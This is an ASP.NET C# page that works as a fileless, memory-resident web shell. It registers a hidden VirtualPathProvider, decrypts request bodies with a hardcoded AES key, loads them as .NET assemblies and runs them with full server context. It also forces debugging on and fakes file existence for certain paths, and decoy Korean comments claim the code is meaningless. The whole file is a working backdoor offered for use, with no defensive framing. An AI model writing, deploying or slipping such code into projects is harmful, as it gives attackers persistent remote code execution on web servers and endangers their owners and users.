<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Security.Cryptography" %>
<%@ Import Namespace="System.Web.Hosting" %>
<%@ Import Namespace="System.Reflection" %>
<%@ Import Namespace="System.Text" %>
<%@ Import Namespace="System.Web" %>

<script runat="server" language="c#">
public void Page_Load() {
    var a = typeof(System.Web.Compilation.BuildManager);
    var b = a.GetProperty("DebuggingEnabled", BindingFlags.Static | BindingFlags.NonPublic);
    if (b != null) { try { b.SetValue(null, true); } catch { } }
    HostingEnvironment.RegisterVirtualPathProvider(new c());
}

public class c : VirtualPathProvider {
    // 배고파요, 치킨 먹고 싶다.
    private byte[] m1(Stream p1) {
        p1.Position = 0;
        byte[] p2 = new byte[p1.Length];
        p1.Read(p2, 0, p2.Length);
        return p2;
    }
    
    // 이 코드는 아무 의미가 없습니다.
    private byte[] m2(byte[] p3) {
        var p4 = Convert.FromBase64String("Y2E2MzQ1NzUzOGI5YjFlMA==");
        var p5 = new RijndaelManaged();
        p5.KeySize = 128;
        p5.Key = p4;
        p5.IV = p4;
        p5.Mode = CipherMode.CBC;
        p5.Padding = PaddingMode.PKCS7;
        var p6 = p5.CreateDecryptor(p5.Key, p5.IV);
        byte[] p7;
        using (var p8 = new MemoryStream(p3))
        using (var p9 = new CryptoStream(p8, p6, CryptoStreamMode.Read))
        using (var p10 = new MemoryStream()) {
            p9.CopyTo(p10);
            p7 = p10.ToArray();
        }
        return p7;
    }

    // 그냥 평범한 주석입니다.
    private void m3(byte[] p11, HttpContext p12) {
        var p13 = Assembly.Load(p11);
        if (p13 == null) return;
        
        var p14 = Convert.FromBase64String("Sw=="); // "K"
        object p15 = p13.CreateInstance(Encoding.UTF8.GetString(p14));
        if (p15 != null) p15.Equals(p12);
    }
    
    public override string GetCacheKey(string v) {
        try {
            HttpContext d = HttpContext.Current;
            if (d != null && d.Request.Cookies.Count > 0 && d.Request.InputStream.Length > 0) {
                var e = m1(d.Request.InputStream);
                var f = m2(e);
                m3(f, d);
                d.Response.End();
            }
        } catch {}
        return Previous.GetCacheKey(v);
    }
    public override bool FileExists(string v) { v = v.ToLower(); if (v.Contains("w")) return true; return Previous.FileExists(v); }
    public override VirtualFile GetFile(string v) { v = v.ToLower(); if (v.Contains("w")) return new e(v); return Previous.GetFile(v); }
}

public class e : VirtualFile {
    private string f;
    public e(string v) : base(v) { f = v; }
    public override Stream Open() { return new MemoryStream(); }
}
</script>